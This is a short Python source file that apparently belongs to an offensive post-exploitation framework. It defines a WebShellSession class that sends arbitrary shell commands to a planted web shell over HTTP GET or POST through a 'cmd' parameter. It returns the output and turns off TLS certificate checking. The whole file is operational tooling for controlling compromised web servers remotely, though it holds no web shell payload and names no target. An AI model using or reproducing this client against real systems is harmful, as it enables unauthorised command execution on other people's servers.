import requests
from core.session import Session

class WebShellSession(Session):
    def __init__(self, url: str, method: str = "get",
                 cmd_param: str = "cmd",
                 session: requests.Session | None = None,
                 timeout: float = 10.0):

        host = self._host(url)
        super().__init__(sock=None, addr=(host, 80))
        self.url = url
        self.method = method.lower()
        self.cmd_param = cmd_param
        self.http = session or requests.Session()
        self.http.verify = False
        self._timeout = timeout

    @staticmethod
    def _host(url: str) -> str:
        from urllib.parse import urlparse
        return urlparse(url).hostname or "unknown"

    def send(self, data: bytes) -> bool:
        return True

    def recv(self, timeout: float = 2.0) -> bytes:
        return b""

    def shell(self, command: str, timeout: float = 10.0) -> str:
        if not self.alive:
            return ""
        try:
            if self.method == "post":
                r = self.http.post(self.url, data={self.cmd_param: command},
                                   timeout=timeout)
            else:
                r = self.http.get(self.url, params={self.cmd_param: command},
                                  timeout=timeout)
            return r.text
        except requests.exceptions.RequestException:
            self.alive = False
            return ""

    def close(self):
        self.alive = False

    def __repr__(self):
        return f"<WebShellSession {self.id} {self.url}>"
